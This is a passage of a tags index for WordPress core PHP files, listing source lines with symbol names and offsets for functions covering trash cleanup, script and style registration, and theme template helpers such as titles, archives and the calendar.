	$delete_timestamp = time() - (60*60*24*EMPTY_TRASH_DAYS);delete_timestamp3250,99890
	$posts_to_delete = $wpdb->get_results($wpdb->prepare("SELECT post_id FROM $wpdb->postmeta WHERE meta_key = '_wp_trash_meta_time' AND meta_value < '%d'", $delete_timestamp), ARRAY_A);posts_to_delete3252,99950
		$post_id = (int) $post['post_id'];post_id3255,100184
		$del_post = get_post($post_id);del_post3259,100254
	$comments_to_delete = $wpdb->get_results($wpdb->prepare("SELECT comment_id FROM $wpdb->commentmeta WHERE meta_key = '_wp_trash_meta_time' AND meta_value < '%d'", $delete_timestamp), ARRAY_A);comments_to_delete3269,100506
		$comment_id = (int) $comment['comment_id'];comment_id3272,100755
		$del_comment = get_comment($comment_id);del_comment3276,100837
function get_file_data( $file, $default_headers, $context = '' ) {get_file_data3304,101834
function get_file_data( $file, $default_headers, $context = '' ) {context3304,101834
	$fp = fopen( $file, 'r' );fp3306,101967
	$file_data = fread( $fp, 8192 );file_data3309,102041
	$file_data = str_replace( "\r", "\n", $file_data );file_data3315,102196
	if ( $context && $extra_headers = apply_filters( "extra_{$context}_headers", array() ) ) {extra_headers3317,102250
		$extra_headers = array_combine( $extra_headers, $extra_headers ); // keys equal valuesextra_headers3318,102342
		$all_headers = array_merge( $extra_headers, (array) $default_headers );all_headers3319,102431
		$all_headers = $default_headers;all_headers3321,102515
	foreach ( $all_headers as $field => $regex ) {field3324,102554
function _search_terms_tidy($t) {_search_terms_tidy3343,102985
function __return_true() {__return_true3356,103193
function __return_false() {__return_false3369,103380
function __return_zero() {__return_zero3382,103556
function __return_empty_array() {__return_empty_array3395,103765
function __return_null() {__return_null3407,103930
function send_nosniff_header() {send_nosniff_header3420,104278
function _wp_mysql_week( $column ) {_wp_mysql_week3432,104539
	switch ( $start_of_week = (int) get_option( 'start_of_week' ) ) {start_of_week3433,104576
 * Finds hierarchy loops using a callback function that maps object IDs to parent IDs.that3449,104868
 * @param callback $callback function that accepts ( ID, $callback_args ) and outputs parent_IDthat3454,104996
function wp_find_hierarchy_loop( $callback, $start, $start_parent, $callback_args = array() ) {wp_find_hierarchy_loop3460,105409
function wp_find_hierarchy_loop( $callback, $start, $start_parent, $callback_args = array() ) {callback_args3460,105409
	$override = is_null( $start_parent ) ? array() : array( $start => $start_parent );override3461,105505
 * @param callback $callback function that accepts ( ID, callback_arg, ... ) and outputs parent_IDthat3478,106106
function wp_find_hierarchy_loop_tortoise_hare( $callback, $start, $override = array(), $callback_args = array(), $_return_loop = false ) {wp_find_hierarchy_loop_tortoise_hare3487,106796
function wp_find_hierarchy_loop_tortoise_hare( $callback, $start, $override = array(), $callback_args = array(), $_return_loop = false ) {override3487,106796
	$tortoise = $hare = $evanescent_hare = $start;tortoise3488,106935
	$return = array();return3489,106983
		( $evanescent_hare = isset( $override[$hare] ) ? $override[$hare] : call_user_func_array( $callback, array_merge( array( $hare ), $callback_args ) ) )evanescent_hare3496,107099
		( $hare = isset( $override[$evanescent_hare] ) ? $override[$evanescent_hare] : call_user_func_array( $callback, array_merge( array( $evanescent_hare ), $callback_args ) ) )hare3498,107256
		if ( $tortoise == $evanescent_hare || $tortoise == $hare )tortoise3504,107577
		$tortoise = isset( $override[$tortoise] ) ? $override[$tortoise] : call_user_func_array( $callback, array_merge( array( $tortoise ), $callback_args ) );tortoise3508,107722
function send_frame_options_header() {send_frame_options_header3522,108097
function wp_allowed_protocols() {wp_allowed_protocols3535,108353
	static $protocols;protocols3536,108387
		$protocols = array( 'http', 'https', 'ftp', 'ftps', 'mailto', 'news', 'irc', 'gopher', 'nntp', 'feed', 'telnet', 'mms', 'rtsp', 'svn' );protocols3539,108438
		$protocols = apply_filters( 'kses_allowed_protocols', $protocols );protocols3540,108577
 * @param string $ignore_class A class to ignore all function calls within - useful when you want to just give info about the calleeto3552,108858
 * @param string $ignore_class A class to ignore all function calls within - useful when you want to just give info about the calleecalls3552,108858
function wp_debug_backtrace_summary( $ignore_class = null, $skip_frames = 0, $pretty = true ) {wp_debug_backtrace_summary3557,109321
function wp_debug_backtrace_summary( $ignore_class = null, $skip_frames = 0, $pretty = true ) {ignore_class3557,109321
		$trace = debug_backtrace( false );trace3559,109471
		$trace = debug_backtrace();trace3561,109514
	$caller = array();caller3563,109545
	$check_class = ! is_null( $ignore_class );check_class3564,109565
			if ( $check_class && $ignore_class == $call['class'] )ignore_class3571,109768
function _get_non_cached_ids( $object_ids, $cache_key ) {_get_non_cached_ids3601,110673
	$clean = array();clean3602,110731
		$id = (int) $id;id3604,110784
function _device_can_upload() {_device_can_upload3621,111035
	$ua = $_SERVER['HTTP_USER_AGENT'];ua3625,111108

wordpress/wp-includes/functions.wp-scripts.php,1555
 * on every page load, the function does not instantiate the WP_Scripts objectdoes13,218
function wp_print_scripts( $handles = false ) {wp_print_scripts21,541
function wp_print_scripts( $handles = false ) {handles21,541
		$handles = false;handles24,662
			$wp_scripts = new WP_Scripts();wp_scripts35,1129
function wp_register_script( $handle, $src, $deps = array(), $ver = false, $in_footer = false ) {wp_register_script52,1644
function wp_register_script( $handle, $src, $deps = array(), $ver = false, $in_footer = false ) {deps52,1644
		$wp_scripts = new WP_Scripts();wp_scripts58,2095
function wp_localize_script( $handle, $object_name, $l10n ) {wp_localize_script86,3050
function wp_deregister_script( $handle ) {wp_deregister_script105,3664
		$wp_scripts = new WP_Scripts();wp_scripts111,4060
function wp_enqueue_script( $handle, $src = false, $deps = array(), $ver = false, $in_footer = false ) {wp_enqueue_script125,4313
function wp_enqueue_script( $handle, $src = false, $deps = array(), $ver = false, $in_footer = false ) {src125,4313
		$wp_scripts = new WP_Scripts();wp_scripts131,4771
		$_handle = explode('?', $handle);_handle135,4824
function wp_dequeue_script( $handle ) {wp_dequeue_script149,5142
		$wp_scripts = new WP_Scripts();wp_scripts155,5535
function wp_script_is( $handle, $list = 'queue' ) {wp_script_is173,5989
function wp_script_is( $handle, $list = 'queue' ) {list173,5989
		$wp_scripts = new WP_Scripts();wp_scripts179,6394
	$query = $wp_scripts->query( $handle, $list );query182,6432

wordpress/wp-includes/functions.wp-styles.php,1451
function wp_print_styles( $handles = false ) {wp_print_styles20,530
function wp_print_styles( $handles = false ) {handles20,530
		$handles = false;handles22,616
			$wp_styles = new WP_Styles();wp_styles36,1134
function wp_add_inline_style( $handle, $data ) {wp_add_inline_style53,1593
		$wp_styles = new WP_Styles();wp_styles59,1992
function wp_register_style( $handle, $src, $deps = array(), $ver = false, $media = 'all' ) {wp_register_style81,2985
function wp_register_style( $handle, $src, $deps = array(), $ver = false, $media = 'all' ) {deps81,2985
		$wp_styles = new WP_Styles();wp_styles87,3428
function wp_deregister_style( $handle ) {wp_deregister_style102,3760
		$wp_styles = new WP_Styles();wp_styles108,4152
function wp_enqueue_style( $handle, $src = false, $deps = array(), $ver = false, $media = 'all' ) {wp_enqueue_style133,5309
function wp_enqueue_style( $handle, $src = false, $deps = array(), $ver = false, $media = 'all' ) {src133,5309
		$wp_styles = new WP_Styles();wp_styles139,5759
		$_handle = explode('?', $handle);_handle143,5810
function wp_dequeue_style( $handle ) {wp_dequeue_style155,6059
		$wp_styles = new WP_Styles();wp_styles161,6448
function wp_style_is( $handle, $list = 'queue' ) {wp_style_is179,6962
function wp_style_is( $handle, $list = 'queue' ) {list179,6962
		$wp_styles = new WP_Styles();wp_styles185,7363
	$query = $wp_styles->query( $handle, $list );query188,7399

wordpress/wp-includes/general-template.php,31962
function get_header( $name = null ) {get_header24,529
function get_header( $name = null ) {name24,529
	$templates = array();templates27,603
function get_footer( $name = null ) {get_footer53,1296
function get_footer( $name = null ) {name53,1296
	$templates = array();templates56,1370
function get_sidebar( $name = null ) {get_sidebar82,2069
function get_sidebar( $name = null ) {name82,2069
	$templates = array();templates85,2145
function get_template_part( $slug, $name = null ) {get_template_part119,3253
function get_template_part( $slug, $name = null ) {name119,3253
	$templates = array();templates122,3363
 * This function is primarily used by themes which want to hardcode the searchis140,3919
 * There is also an action that is called whenever the function is run called,is143,4070
function get_search_form($echo = true) {get_search_form151,4454
	$search_form_template = locate_template('searchform.php');search_form_template154,4529
	$form = '<form role="search" method="get" id="searchform" action="' . esc_url( home_url( '/' ) ) . '" >form160,4675
function wp_loginout($redirect = '', $echo = true) {wp_loginout185,5572
function wp_loginout($redirect = '', $echo = true) {echo185,5572
		$link = '<a href="' . esc_url( wp_login_url($redirect) ) . '">' . __('Log in') . '</a>';link187,5655
		$link = '<a href="' . esc_url( wp_logout_url($redirect) ) . '">' . __('Log out') . '</a>';link189,5752
function wp_logout_url($redirect = '') {wp_logout_url209,6299
	$args = array( 'action' => 'logout' );args210,6340
	$logout_url = add_query_arg($args, site_url('wp-login.php', 'login'));logout_url215,6461
	$logout_url = wp_nonce_url( $logout_url, 'log-out' );logout_url216,6533
function wp_login_url($redirect = '', $force_reauth = false) {wp_login_url234,7087
function wp_login_url($redirect = '', $force_reauth = false) {force_reauth234,7087
	$login_url = site_url('wp-login.php', 'login');login_url235,7150
		$login_url = add_query_arg('redirect_to', urlencode($redirect), $login_url);login_url238,7226
		$login_url = add_query_arg('reauth', '1', $login_url);login_url241,7328
function wp_login_form( $args = array() ) {wp_login_form254,7762
function wp_login_form( $args = array() ) {args254,7762
	$defaults = array( 'echo' => true,defaults255,7806
	$args = wp_parse_args( $args, apply_filters( 'login_form_defaults', $defaults ) );args270,8517
	$form = 'form272,8602
function wp_lostpassword_url( $redirect = '' ) {wp_lostpassword_url309,10564
function wp_lostpassword_url( $redirect = '' ) {redirect309,10564
	$args = array( 'action' => 'lostpassword' );args310,10613
	$lostpassword_url = add_query_arg( $args, network_site_url('wp-login.php', 'login') );lostpassword_url315,10727
function wp_register( $before = '<li>', $after = '</li>', $echo = true ) {wp_register332,11425
function wp_register( $before = '<li>', $after = '</li>', $echo = true ) {before332,11425
			$link = $before . '<a href="' . site_url('wp-login.php?action=register', 'login') . '">' . __('Register') . '</a>' . $after;link336,11575
			$link = '';link338,11710
		$link = $before . '<a href="' . admin_url() . '">' . __('Site Admin') . '</a>' . $after;link340,11735
 * Theme container function for the 'wp_meta' action.for350,11941
function wp_meta() {wp_meta359,12289
function bloginfo( $show='' ) {bloginfo371,12506
function bloginfo( $show='' ) {show371,12506
 * The deprecated blog info options are listed in the function contents.contents380,12780
function get_bloginfo( $show = '', $filter = 'raw' ) {get_bloginfo400,13586
function get_bloginfo( $show = '', $filter = 'raw' ) {show400,13586
			$output = home_url();output407,13982
			$output = site_url();output410,14034
			$output = get_option('blogdescription');output413,14091
			$output = get_feed_link('rdf');output416,14163
			$output = get_feed_link('rss');output419,14226
			$output = get_feed_link('rss2');output422,14290
			$output = get_feed_link('atom');output425,14355
			$output = get_feed_link('comments_atom');output428,14429
			$output = get_feed_link('comments_rss2');output431,14512
			$output = get_option('siteurl') .'/xmlrpc.php';output434,14590
			$output = get_stylesheet_uri();output437,14676
			$output = get_stylesheet_directory_uri();output440,14752
			$output = get_template_directory_uri();output444,14859
			$output = get_option('admin_email');output447,14934
			$output = get_option('blog_charset');output450,15002
			if ('' == $output) $output = 'UTF-8';output451,15043
			$output = get_option('html_type');output454,15115
			$output = $wp_version;output458,15204
			$output = get_locale();output461,15259
			$output = str_replace('_', '-', $output);output462,15286
			//_deprecated_argument( __FUNCTION__, '2.2', sprintf( __('The <code>%s</code> option is deprecated for the family of <code>bloginfo()</code> functions.' ), $show ) . ' ' . sprintf( __( 'Use the <code>%s</code> function instead.' ), 'is_rtl()'  ) );instead465,15366
				$output = is_rtl() ? 'rtl' : 'ltr';output467,15658
				$output = 'ltr';output469,15710
			$output = get_option('blogname');output474,15772
	$url = true;url478,15823
		$url = false;url482,15953
			$output = apply_filters('bloginfo_url', $output, $show);output486,16015
			$output = apply_filters('bloginfo', $output, $show);output488,16082
function get_current_blog_id() {get_current_blog_id501,16247
function wp_title($sep = '&raquo;', $display = true, $seplocation = '') {wp_title528,17466
function wp_title($sep = '&raquo;', $display = true, $seplocation = '') {display528,17466
	$m = get_query_var('m');m531,17568
	$year = get_query_var('year');year532,17594
	$monthnum = get_query_var('monthnum');monthnum533,17626
	$day = get_query_var('day');day534,17666
	$search = get_query_var('s');search535,17696
	$title = '';title536,17727
	$t_sep = '%WP_TITILE_SEP%'; // Temporary separator, for accurate flipping, if necessaryt_sep538,17742
		$title = single_post_title( '', false );title542,17951
		$title = single_term_title( '', false );title547,18067
		$term = get_queried_object();term552,18159
		$tax = get_taxonomy( $term->taxonomy );tax553,18191
		$title = single_term_title( $tax->labels->name . $t_sep, false );title554,18233
		$author = get_queried_object();author559,18352
		$title = $author->display_name;title560,18386
		$title = post_type_archive_title( '', false );title565,18490
		$my_year = substr($m, 0, 4);my_year569,18600
		$my_month = $wp_locale->get_month(substr($m, 4, 2));my_month570,18631
		$my_day = intval(substr($m, 6, 2));my_day571,18686
		$title = $my_year . ( $my_month ? $t_sep . $my_month : '' ) . ( $my_day ? $t_sep . $my_day : '' );title572,18724
		$title = $year;title577,18891
		$title = sprintf(__('Search Results %1$s %2$s'), $t_sep, strip_tags($search));title587,19153
		$title = __('Page not found');title592,19280
	$prefix = '';prefix595,19317
		$prefix = " $sep ";prefix597,19355
		$title_array = explode( $t_sep, $title );title_array601,19524
		$title_array = array_reverse( $title_array );title_array602,19568
		$title = implode( " $sep ", $title_array ) . $prefix;title603,19616
		$title_array = explode( $t_sep, $title );title_array605,19682
		$title = $prefix . implode( " $sep ", $title_array );title606,19726
	$title = apply_filters('wp_title', $title, $sep, $seplocation);title609,19786
function single_post_title($prefix = '', $display = true) {single_post_title635,20632
function single_post_title($prefix = '', $display = true) {display635,20632
	$_post = get_queried_object();_post636,20692
	$title = apply_filters('single_post_title', $_post->post_title, $_post);title641,20771
function post_type_archive_title( $prefix = '', $display = true ) {post_type_archive_title660,21364
function post_type_archive_title( $prefix = '', $display = true ) {prefix660,21364
	$post_type_obj = get_queried_object();post_type_obj664,21476
	$title = apply_filters('post_type_archive_title', $post_type_obj->labels->name );title665,21516
function single_cat_title( $prefix = '', $display = true ) {single_cat_title690,22458
function single_cat_title( $prefix = '', $display = true ) {prefix690,22458
function single_tag_title( $prefix = '', $display = true ) {single_tag_title711,23363
function single_tag_title( $prefix = '', $display = true ) {prefix711,23363
function single_term_title( $prefix = '', $display = true ) {single_term_title732,24293
function single_term_title( $prefix = '', $display = true ) {prefix732,24293
	$term = get_queried_object();term733,24355
		$term_name = apply_filters( 'single_cat_title', $term->name );term_name739,24435
		$term_name = apply_filters( 'single_tag_title', $term->name );term_name741,24521
		$term_name = apply_filters( 'single_term_title', $term->name );term_name743,24607
function single_month_title($prefix = '', $display = true ) {single_month_title774,25663
function single_month_title($prefix = '', $display = true ) {display774,25663
	$m = get_query_var('m');m777,25746
	$year = get_query_var('year');year778,25772
	$monthnum = get_query_var('monthnum');monthnum779,25804
		$my_year = $year;my_year782,25890
		$my_month = $wp_locale->get_month($monthnum);my_month783,25910
		$my_year = substr($m, 0, 4);my_year785,25985
		$my_month = $wp_locale->get_month(substr($m, 4, 2));my_month786,26016
	$result = $prefix . $my_month . $prefix . $my_year;result792,26117
function get_archives_link($url, $text, $format = 'html', $before = '', $after = '') {get_archives_link832,27697
function get_archives_link($url, $text, $format = 'html', $before = '', $after = '') {format832,27697
	$text = wptexturize($text);text833,27784
	$title_text = esc_attr($text);title_text834,27813
	$url = esc_url($url);url835,27845
		$link_html = "\t<link rel='archives' title='$title_text' href='$url' />\n";link_html838,27893
		$link_html = "\t<option value='$url'>$before $text $after</option>\n";link_html840,28001
		$link_html = "\t<li>$before<a href='$url' title='$title_text'>$text</a>$after</li>\n";link_html842,28102
		$link_html = "\t$before<a href='$url' title='$title_text'>$text</a>$after\n";link_html844,28207
	$link_html = apply_filters( 'get_archives_link', $link_html );link_html846,28288
function wp_get_archives($args = '') {wp_get_archives877,29534
	$defaults = array(defaults880,29601
	$r = wp_parse_args( $args, $defaults );r887,29761
		$type = 'monthly';type891,29850
		$limit = absint($limit);limit894,29895
		$limit = ' LIMIT '.$limit;limit895,29922
	$archive_week_separator = '&#8211;';archive_week_separator899,30016
	$archive_date_format_over_ride = 0;archive_date_format_over_ride902,30154
	$archive_day_date_format = 'Y/m/d';archive_day_date_format905,30270
	$archive_week_start_date_format = 'Y/m/d';archive_week_start_date_format908,30387
	$archive_week_end_date_format	= 'Y/m/d';archive_week_end_date_format909,30431
		$archive_day_date_format = get_option('date_format');archive_day_date_format912,30516
		$archive_week_start_date_format = get_option('date_format');archive_week_start_date_format913,30572
		$archive_week_end_date_format = get_option('date_format');archive_week_end_date_format914,30635
	$where = apply_filters( 'getarchives_where', "WHERE post_type = 'post' AND post_status = 'publish'", $r );where918,30711
	$join = apply_filters( 'getarchives_join', '', $r );join919,30819
	$output = '';output921,30874
		$query = "SELECT YEAR(post_date) AS `year`, MONTH(post_date) AS `month`, count(ID) as posts FROM $wpdb->posts $join $where GROUP BY YEAR(post_date), MONTH(post_date) ORDER BY post_date DESC $limit";query924,30919
		$key = md5($query);key925,31120
		$cache = wp_cache_get( 'wp_get_archives' , 'general');cache926,31142
			$arcresults = $wpdb->get_results($query);arcresults928,31235
			$arcresults = $cache[ $key ];arcresults932,31381
			$afterafter = $after;afterafter935,31441
				$url = get_month_link( $arcresult->year, $arcresult->month );url937,31517
				$text = sprintf(__('%1$s %2$d'), $wp_locale->get_month($arcresult->month), $arcresult->year);text939,31637
					$after = '&nbsp;('.$arcresult->posts.')' . $afterafter;after941,31763
		$query = "SELECT YEAR(post_date) AS `year`, count(ID) as posts FROM $wpdb->posts $join $where GROUP BY YEAR(post_date) ORDER BY post_date DESC $limit";query946,31938
		$key = md5($query);key947,32092
		$cache = wp_cache_get( 'wp_get_archives' , 'general');cache948,32114
			$arcresults = $wpdb->get_results($query);arcresults950,32207
			$arcresults = $cache[ $key ];arcresults954,32353
			$afterafter = $after;afterafter957,32411
				$url = get_year_link($arcresult->year);url959,32486
				$text = sprintf('%d', $arcresult->year);text960,32530
					$after = '&nbsp;('.$arcresult->posts.')' . $afterafter;after962,32601
		$query = "SELECT YEAR(post_date) AS `year`, MONTH(post_date) AS `month`, DAYOFMONTH(post_date) AS `dayofmonth`, count(ID) as posts FROM $wpdb->posts $join $where GROUP BY YEAR(post_date), MONTH(post_date), DAYOFMONTH(post_date) ORDER BY post_date DESC $limit";query967,32777
		$key = md5($query);key968,33040
		$cache = wp_cache_get( 'wp_get_archives' , 'general');cache969,33062
			$arcresults = $wpdb->get_results($query);arcresults971,33155
			$arcresults = $cache[ $key ];arcresults975,33301
			$afterafter = $after;afterafter978,33361
				$url	= get_day_link($arcresult->year, $arcresult->month, $arcresult->dayofmonth);url980,33437
				$date = sprintf('%1$d-%2$02d-%3$02d 00:00:00', $arcresult->year, $arcresult->month, $arcresult->dayofmonth);date981,33523
				$text = mysql2date($archive_day_date_format, $date);text982,33636
					$after = '&nbsp;('.$arcresult->posts.')'.$afterafter;after984,33719
		$week = _wp_mysql_week( '`post_date`' );week989,33894
		$query = "SELECT DISTINCT $week AS `week`, YEAR( `post_date` ) AS `yr`, DATE_FORMAT( `post_date`, '%Y-%m-%d' ) AS `yyyymmdd`, count( `ID` ) AS `posts` FROM `$wpdb->posts` $join $where GROUP BY $week, YEAR( `post_date` ) ORDER BY `post_date` DESC $limit";query990,33937
		$key = md5($query);key991,34194
		$cache = wp_cache_get( 'wp_get_archives' , 'general');cache992,34216
			$arcresults = $wpdb->get_results($query);arcresults994,34309
			$arcresults = $cache[ $key ];arcresults998,34455
		$arc_w_last = '';arc_w_last1000,34492
		$afterafter = $after;afterafter1001,34512
						$arc_year = $arcresult->yr;arc_year1005,34657
						$arc_w_last = $arcresult->week;arc_w_last1006,34691
						$arc_week = get_weekstartend($arcresult->yyyymmdd, get_option('start_of_week'));arc_week1007,34729
						$arc_week_start = date_i18n($archive_week_start_date_format, $arc_week['start']);arc_week_start1008,34816
						$arc_week_end = date_i18n($archive_week_end_date_format, $arc_week['end']);arc_week_end1009,34904
						$url  = sprintf('%1$s/%2$s%3$sm%4$s%5$s%6$sw%7$s%8$d', home_url(), '', '?', '=', $arc_year, '&amp;', '=', $arcresult->week);url1010,34986
						$text = $arc_week_start . $archive_week_separator . $arc_week_end;text1011,35117
							$after = '&nbsp;('.$arcresult->posts.')'.$afterafter;after1013,35218
		$orderby = ('alpha' == $type) ? 'post_title ASC ' : 'post_date DESC ';orderby1019,35435
		$query = "SELECT * FROM $wpdb->posts $join $where ORDER BY $orderby $limit";query1020,35508
		$key = md5($query);key1021,35587
		$cache = wp_cache_get( 'wp_get_archives' , 'general');cache1022,35609
			$arcresults = $wpdb->get_results($query);arcresults1024,35702
			$arcresults = $cache[ $key ];arcresults1028,35848
					$url  = get_permalink( $arcresult );url1033,36019
						$text = strip_tags( apply_filters( 'the_title', $arcresult->post_title, $arcresult->ID ) );text1035,36096
						$text = $arcresult->ID;text1037,36204
function calendar_week_mod($num) {calendar_week_mod1058,36573
	$base = 7;base1059,36608
function get_calendar($initial = true, $echo = true) {get_calendar1074,37043
function get_calendar($initial = true, $echo = true) {echo1074,37043
	$cache = array();cache1077,37156
	$key = md5( $m . $monthnum . $year );key1078,37175
	if ( $cache = wp_cache_get( 'get_calendar', 'calendar' ) ) {cache1079,37214
		$cache = array();cache1091,37528
		$gotsome = $wpdb->get_var("SELECT 1 as test FROM $wpdb->posts WHERE post_type = 'post' AND post_status = 'publish' LIMIT 1");gotsome1095,37619
		$w = ''.intval($_GET['w']);w1104,37892
	$week_begins = intval(get_option('start_of_week'));week_begins1107,37961
		$thismonth = ''.zeroise(intval($monthnum), 2);thismonth1111,38093
		$thisyear = ''.intval($year);thisyear1112,38142
		$thisyear = ''.intval(substr($m, 0, 4));thisyear1115,38242
		$d = (($w - 1) * 7) + 6; //it seems MySQL's weeks disagree with PHP'sd1116,38285
		$thismonth = $wpdb->get_var("SELECT DATE_FORMAT((DATE_ADD('{$thisyear}0101', INTERVAL $d DAY) ), '%m')");thismonth1117,38357
		$thisyear = ''.intval(substr($m, 0, 4));thisyear1119,38492
				$thismonth = '01';thismonth1121,38559
				$thismonth = ''.zeroise(intval(substr($m, 4, 2)), 2);thismonth1123,38589
		$thisyear = gmdate('Y', current_time('timestamp'));thisyear1125,38657
		$thismonth = gmdate('m', current_time('timestamp'));thismonth1126,38711
	$unixmonth = mktime(0, 0 , 0, $thismonth, 1, $thisyear);unixmonth1129,38770
	$last_day = date('t', $unixmonth);last_day1130,38828
	$previous = $wpdb->get_row("SELECT MONTH(post_date) AS month, YEAR(post_date) AS yearprevious1133,38933
	$next = $wpdb->get_row("SELECT MONTH(post_date) AS month, YEAR(post_date) AS yearnext1139,39180
	$calendar_caption = _x('%1$s %2$s', 'calendar caption');calendar_caption1147,39510
	$calendar_output = '<table id="wp-calendar">calendar_output1148,39568
	$myweek = array();myweek1153,39745
	for ( $wdcount=0; $wdcount<=6; $wdcount++ ) {wdcount1155,39766
		$day_name = (true == $initial) ? $wp_locale->get_weekday_initial($wd) : $wp_locale->get_weekday_abbrev($wd);day_name1160,39913
		$wd = esc_attr($wd);wd1161,40024
	$dayswithposts = $wpdb->get_results("SELECT DISTINCT DAYOFMONTH(post_date)dayswithposts1194,41338
		$daywithpost = array();daywithpost1203,41747
		$ak_title_separator = "\n";ak_title_separator1207,41957
		$ak_title_separator = ', ';ak_title_separator1209,41993
	$ak_titles_for_day = array();ak_titles_for_day1211,42024
	$ak_post_titles = $wpdb->get_results("SELECT ID, post_title, DAYOFMONTH(post_date) as dom "ak_post_titles1212,42055
				$post_title = esc_attr( apply_filters( 'the_title', $ak_post_title->post_title, $ak_post_title->ID ) );post_title1221,42452
	$pad = calendar_week_mod(date('w', $unixmonth)-$week_begins);pad1233,42969
	$daysinmonth = intval(date('t', $unixmonth));daysinmonth1237,43144
	for ( $day = 1; $day <= $daysinmonth; ++$day ) {day1238,43191
		$newrow = false;newrow1241,43326
		if ( $day == gmdate('j', current_time('timestamp')) && $thismonth == gmdate('m', current_time('timestamp')) && $thisyear == gmdate('Y', current_time('timestamp')) )day1243,43346
			$newrow = true;newrow1255,43977
	$pad = 7 - calendar_week_mod(date('w', mktime(0, 0 , 0, $thismonth, $day, $thisyear))-$week_begins);pad1258,44000
function delete_get_calendar_cache() {delete_get_calendar_cache1280,44613
function allowed_tags() {allowed_tags1299,45287
	$allowed = '';allowed1301,45335
	foreach ( (array) $allowedtags as $tag => $attributes ) {tag1302,45351
			foreach ( $attributes as $attribute => $limits ) {attribute1305,45468
function the_date_xml() {the_date_xml1321,45737
 * function is called several times for each post.is1333,46117
function the_date( $d = '', $before = '', $after = '', $echo = true ) {the_date1346,46694
function the_date( $d = '', $before = '', $after = '', $echo = true ) {d1346,46694
	$the_date = '';the_date1348,46801
		$previousday = $currentday;previousday1353,46938
		$the_date = apply_filters('the_date', $the_date, $d, $before, $after);the_date1355,46969
 * Unlike the_date() this function will always return the date.will1369,47185
function get_the_date( $d = '' ) {get_the_date1377,47484
function get_the_date( $d = '' ) {d1377,47484
	$the_date = '';the_date1379,47534
function the_modified_date($d = '', $before='', $after='', $echo = true) {the_modified_date1400,48211
function the_modified_date($d = '', $before='', $after='', $echo = true) {before1400,48211
	$the_modified_date = $before . get_the_modified_date($d) . $after;the_modified_date1402,48287
	$the_modified_date = apply_filters('the_modified_date', $the_modified_date, $d, $before, $after);the_modified_date1403,48355
function get_the_modified_date($d = '') {get_the_modified_date1420,48725
		$the_time = get_post_modified_time(get_option('date_format'), null, null, true);the_time1422,48784
		$the_time = get_post_modified_time($d, null, null, true);the_time1424,48873
function the_time( $d = '' ) {the_time1435,49136
function the_time( $d = '' ) {d1435,49136
function get_the_time( $d = '', $post = null ) {get_the_time1448,49538
function get_the_time( $d = '', $post = null ) {d1448,49538
	$post = get_post($post);post1449,49587
		$the_time = get_post_time(get_option('time_format'), false, $post, true);the_time1452,49631
		$the_time = get_post_time($d, false, $post, true);the_time1454,49713
function get_post_time( $d = 'U', $gmt = false, $post = null, $translate = false ) { // returns timestampget_post_time1469,50226
function get_post_time( $d = 'U', $gmt = false, $post = null, $translate = false ) { // returns timestampd1469,50226
	$post = get_post($post);post1470,50332
		$time = $post->post_date_gmt;time1473,50372
		$time = $post->post_date;time1475,50410
	$time = mysql2date($d, $time, $translate);time1477,50439
function the_modified_time($d = '') {the_modified_time1488,50754
function get_the_modified_time($d = '') {get_the_modified_time1500,51098
		$the_time = get_post_modified_time(get_option('time_format'), null, null, true);the_time1502,51157
		$the_time = get_post_modified_time($d, null, null, true);the_time1504,51246
function get_post_modified_time( $d = 'U', $gmt = false, $post = null, $translate = false ) {get_post_modified_time1519,51838
function get_post_modified_time( $d = 'U', $gmt = false, $post = null, $translate = false ) {d1519,51838
	$post = get_post($post);post1520,51932
		$time = $post->post_modified_gmt;time1523,51972
		$time = $post->post_modified;time1525,52014
	$time = mysql2date($d, $time, $translate);time1526,52046
function the_weekday() {the_weekday1538,52275
	$the_weekday = $wp_locale->get_weekday(mysql2date('w', $post->post_date, false));the_weekday1540,52327
	$the_weekday = apply_filters('the_weekday', $the_weekday);the_weekday1541,52410
function the_weekday_date($before='',$after='') {the_weekday_date1556,52801
	$the_weekday_date = '';the_weekday_date1558,52902
		$previousweekday = $currentday;previousweekday1563,53122
	$the_weekday_date = apply_filters('the_weekday_date', $the_weekday_date, $before, $after);the_weekday_date1565,53159
function wp_head() {wp_head1575,53376
function wp_footer() {wp_footer1585,53524
function feed_links( $args = array() ) {feed_links1596,53690
function feed_links( $args = array() ) {args1596,53690
	$defaults = array(defaults1600,53798
	$args = wp_parse_args( $args, $defaults );args1609,54147
function feed_links_extra( $args = array() ) {feed_links_extra1622,54767
function feed_links_extra( $args = array() ) {args1622,54767
	$defaults = array(defaults1623,54814
	$args = wp_parse_args( $args, $defaults );args1638,55613
		$id = 0;id1641,55693
		$post = &get_post( $id );post1642,55704
			$title = sprintf( $args['singletitle'], get_bloginfo('name'), $args['separator'], esc_html( get_the_title() ) );title1645,55804
			$href = get_post_comments_feed_link( $post->ID );href1646,55920
		$term = get_queried_object();term1649,56007
		$title = sprintf( $args['cattitle'], get_bloginfo('name'), $args['separator'], $term->name );title1651,56040
		$href = get_category_feed_link( $term->term_id );href1652,56136
		$term = get_queried_object();term1654,56213
		$title = sprintf( $args['tagtitle'], get_bloginfo('name'), $args['separator'], $term->name );title1656,56246
		$href = get_tag_feed_link( $term->term_id );href1657,56342
		$author_id = intval( get_query_var('author') );author_id1659,56417
		$title = sprintf( $args['authortitle'], get_bloginfo('name'), $args['separator'], get_the_author_meta( 'display_name', $author_id ) );title1661,56468
		$href = get_author_feed_link( $author_id );href1662,56605
		$title = sprintf( $args['searchtitle'], get_bloginfo('name'), $args['separator'], get_search_query( false ) );title1664,56679
		$href = get_search_feed_link();href1665,56792
function rsd_link() {rsd_link1678,57158
function wlwmanifest_link() {wlwmanifest_link1688,57461
function noindex() {noindex1704,58011
function wp_no_robots() {wp_no_robots1718,58377
function rich_edit_exists() {rich_edit_exists1731,58675
		$wp_rich_edit_exists = file_exists(ABSPATH . WPINC . '/js/tinymce/tiny_mce.js');wp_rich_edit_exists1734,58772
function user_can_richedit() {user_can_richedit1748,59095
		$wp_rich_edit = false;wp_rich_edit1752,59236
				$wp_rich_edit = ! wp_is_mobile() || ( preg_match( '!AppleWebKit/(\d+)!', $_SERVER['HTTP_USER_AGENT'], $match ) && intval( $match[1] ) >= 534 );wp_rich_edit1756,59407
				$wp_rich_edit = true;wp_rich_edit1758,59620
function wp_default_editor() {wp_default_editor1776,59954
	$r = user_can_richedit() ? 'tinymce' : 'html'; // defaultsr1777,59985
	if ( $user = wp_get_current_user() ) { // look for cookieuser1778,60045
		$ed = get_user_setting('editor', 'tinymce');ed1779,60104
